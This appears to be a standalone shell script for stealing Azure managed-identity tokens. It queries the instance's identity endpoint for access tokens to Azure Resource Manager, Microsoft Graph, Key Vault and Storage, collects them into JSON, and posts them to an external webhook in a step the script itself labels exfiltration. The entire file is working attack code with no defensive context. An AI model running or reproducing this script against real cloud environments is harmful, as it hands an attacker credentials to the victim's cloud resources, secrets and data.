#!/bin/sh

if [ -z "$WEBHOOK_URL" ]; then
    echo "Error: WEBHOOK_URL environment variable is not set."
    exit 1
fi

RESOURCES=(
    "https://management.azure.com/"
    "https://graph.microsoft.com/"
    "https://vault.azure.net"
    "https://storage.azure.com"
)

OUTPUT_JSON="{}"

echo "Starting token collection from $IDENTITY_ENDPOINT..."

for R in "${RESOURCES[@]}"; do

    RESPONSE=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
        "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=$R")


    TOKEN=$(echo "$RESPONSE" | jq -r '.access_token // .message')


    OUTPUT_JSON=$(echo "$OUTPUT_JSON" | jq --arg key "$R" --arg val "$TOKEN" '.[$key] = $val')
done

echo "Exfiltrating to $WEBHOOK_URL..."
curl -s -X POST -H "Content-Type: application/json" -d "$OUTPUT_JSON" "$WEBHOOK_URL"
